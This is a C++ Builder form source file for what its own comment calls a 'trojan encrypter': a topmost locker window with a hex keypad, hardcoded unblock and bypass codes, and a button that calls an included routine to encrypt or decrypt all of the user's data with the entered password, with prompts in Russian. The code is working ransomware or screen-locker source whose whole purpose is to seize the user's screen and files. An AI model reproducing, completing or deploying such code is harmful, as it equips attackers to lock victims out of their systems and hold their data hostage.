#include <vcl.h>
#include <stdio.h>
#include <string.h>

#define PASSWORD_LEN 73

#define TUMBLER_FALSE      0x00000000
#define TUMBLER_TRUE       0xFFFFFFFF

#define SYSTEM_UNBLOCK     "12439524"
#define SYSTEM_ENCRYPT     "DEADDEADDEAD"
#define SYSTEM_ALL_LIFE    "C0FFEEC0FFEE"

#define STR_SYSTEM_BLOCKED "SYSTEM BLOCKED"
#define STR_ENCRYPT_SYSTEM "ENCRYPT SYSTEM"
#define STR_ENTER_PASSWORD "ENTER PASSWORD"

#pragma hdrstop

/* This is source code trojan encrypter */
#include "atora.c"

#include "Unit1.h"
#include "Unit2.h"

#pragma package(smart_init)
#pragma resource "*.dfm"

unsigned long int TUMBLER_ENCRYPT_SYSTEM   = TUMBLER_FALSE;
unsigned long int TUMBLER_BLOCKED_ACTIVATE = TUMBLER_FALSE;

char PASSWORD[PASSWORD_LEN];

TForm2 *Form2;

__fastcall TForm2::TForm2(TComponent* Owner): TForm(Owner) {
}

void PasswordClear(void) {
  if (0x00 != (*PASSWORD)) {
    meminit((void*)PASSWORD, 0x00, PASSWORD_LEN);
    Form2->Memo1->Clear();
  }
}

void PASSWORDGEN(int number) {
  int passlen = strlen(Form2->Memo1->Text.c_str());

  if (passlen < (PASSWORD_LEN - 1)) {
    memcpy((void*)PASSWORD, (void*)Form2->Memo1->Text.c_str(), passlen);
    PASSWORD[passlen] = (unsigned char)number;

    Form2->Memo1->Clear();
    Form2->Memo1->Text = AnsiString((char*)PASSWORD);
  }
  else {
    PasswordClear();
  }
}
//---------------------------------------------------------------------------
void __fastcall TForm2::Button1MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(0 + 48);
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button2MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(1 + 48);
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button3MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(2 + 48);
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button4MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(3 + 48);
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button5MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(4 + 48);         
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button6MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(5 + 48);         
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button7MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(6 + 48);         
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button8MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(7 + 48);
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button9MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(8 + 48);         
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button10MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN(9 + 48);         
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button11MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN('A');
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button12MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN('B');
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button13MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN('C');         
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button14MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN('D');
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button15MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN('E');
}
//---------------------------------------------------------------------------

void __fastcall TForm2::Button16MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
 PASSWORDGEN('F');
}
//---------------------------------------------------------------------------

uint32_t MessageForUser(const int    tumbler,
                        const char * head,
                        const char * message) {
                        
  uint32_t result = Application->MessageBox(message, head, tumbler);

  return result;
}

void __fastcall TForm2::Button17MouseUp(TObject    * Sender,
                                        TMouseButton Button,
                                        TShiftState  Shift, int X, int Y) {
		  
  if (TUMBLER_BLOCKED_ACTIVATE == TUMBLER_TRUE) {
	
    if (strcmp(PASSWORD, SYSTEM_ALL_LIFE) == 0) {
      Form2->Shape1->Brush->Color = clGreen;
      Form2->Memo1->Color = clGreen;

      Form2->Label1->Caption = STR_ENTER_PASSWORD;
      TUMBLER_BLOCKED_ACTIVATE = TUMBLER_FALSE;

      PasswordClear();
      return;
    }

    if (TUMBLER_ENCRYPT_SYSTEM == TUMBLER_TRUE) {
      if (MessageForUser(MB_ICONWARNING + MB_YESNO,
          "Предупреждение", "Расшифровать все данные?") == IDYES) {

        Form2->Button17->Enabled = False;
        Form2->Button17->Update();
          global(PASSWORD, strlen(PASSWORD));
        Form2->Button17->Enabled = True;
        Form2->Label1->Caption = STR_ENTER_PASSWORD;
        Form2->Shape1->Brush->Color = clGreen;
        Form2->Memo1->Color = clGreen;

        TUMBLER_BLOCKED_ACTIVATE = TUMBLER_FALSE;
      }
    }
    else
    if (TUMBLER_ENCRYPT_SYSTEM == TUMBLER_FALSE) {
      if (MessageForUser(MB_ICONWARNING + MB_YESNO,
          "Предупреждение", "Зашифровать все данные?") == IDYES) {

        Form2->Button17->Enabled = False;
        Form2->Button17->Update();
          global(PASSWORD, strlen(PASSWORD));
        Form2->Button17->Enabled = True;
        Form2->Label1->Caption = STR_SYSTEM_BLOCKED;

        TUMBLER_ENCRYPT_SYSTEM = TUMBLER_TRUE;
      }
    }
    PasswordClear();
    return;
  }

  if (strcmp(PASSWORD, SYSTEM_UNBLOCK) == 0) {
    Form2->Close();
    Form1->Close();
  }
  else
  if (strcmp(PASSWORD, SYSTEM_ENCRYPT) == 0) {
    /* Next enter string encrypt all data your password */
    Form2->Shape1->Brush->Color = clMaroon;
    Form2->Memo1->Color = clMaroon;
    Form2->Label1->Caption = STR_ENCRYPT_SYSTEM;

    TUMBLER_BLOCKED_ACTIVATE = TUMBLER_TRUE;
  }
  
  PasswordClear();
}
//---------------------------------------------------------------------------

void __fastcall TForm2::FormDeactivate(TObject *Sender) {
  // SetWindowPos(Handle, HWND_TOPMOST, 0, 0, 0, 0,
  // SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
  SetWindowPos(Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
}
//---------------------------------------------------------------------------

void __fastcall TForm2::FormShow(TObject *Sender) {
  /* Timer1 start = True */
  /* Form1->Timer1->Enabled = True; */
}
//---------------------------------------------------------------------------



